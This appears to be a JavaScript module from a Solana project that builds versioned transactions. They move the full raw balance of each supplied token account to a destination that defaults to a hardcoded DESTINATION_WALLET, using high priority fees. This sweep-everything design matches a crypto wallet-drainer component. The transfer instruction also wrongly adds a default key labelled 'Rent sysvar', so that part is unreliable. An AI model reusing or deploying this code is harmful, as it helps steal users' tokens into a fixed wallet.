/**
 * TRANSACTION BUILDER - Versioned transactions with V0 support
 */

const { 
  TransactionMessage, 
  VersionedTransaction,
  ComputeBudgetProgram,
  SystemProgram,
  PublicKey
} = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, DESTINATION_WALLET } = require('../../config/constants');

class TransactionBuilder {
  constructor(connection) {
    this.connection = connection;
  }

  /**
   * Build a versioned transaction (V0) for token transfers
   */
  async buildVersionedTransfer(
    walletPubkey,
    tokenAccounts,
    destination = DESTINATION_WALLET,
    lookupTables = []
  ) {
    // Get latest blockhash
    const { blockhash, lastValidBlockHeight } = await this.connection.getLatestBlockhash('finalized');

    // Build instructions
    const instructions = [];

    // Add compute budget for priority
    instructions.push(
      ComputeBudgetProgram.setComputeUnitLimit({ units: 450000 }),
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 2000000 })
    );

    // Add transfer instructions for each token
    for (const token of tokenAccounts) {
      const transferIx = this.createTokenTransferIx(
        token.accountAddress,
        token.destinationAta,
        walletPubkey,
        token.rawBalance
      );
      instructions.push(transferIx);
    }

    // Compile to V0 message with lookup tables
    const message = new TransactionMessage({
      payerKey: walletPubkey,
      recentBlockhash: blockhash,
      instructions,
    }).compileToV0Message(lookupTables);

    // Create versioned transaction
    const transaction = new VersionedTransaction(message);

    return {
      transaction,
      blockhash,
      lastValidBlockHeight,
      instructions: instructions.length
    };
  }

  /**
   * Create token transfer instruction
   */
  createTokenTransferIx(source, destination, owner, amount) {
    return {
      programId: TOKEN_PROGRAM_ID,
      keys: [
        { pubkey: source, isSigner: false, isWritable: true },
        { pubkey: destination, isSigner: false, isWritable: true },
        { pubkey: owner, isSigner: true, isWritable: false },
        { pubkey: PublicKey.default, isSigner: false, isWritable: false } // Rent sysvar
      ],
      data: Buffer.from([3, ...this.uint64ToBytes(amount)]) // Transfer instruction
    };
  }

  uint64ToBytes(value) {
    const buffer = Buffer.alloc(8);
    buffer.writeBigUInt64LE(BigInt(value));
    return [...buffer];
  }
}

module.exports = TransactionBuilder;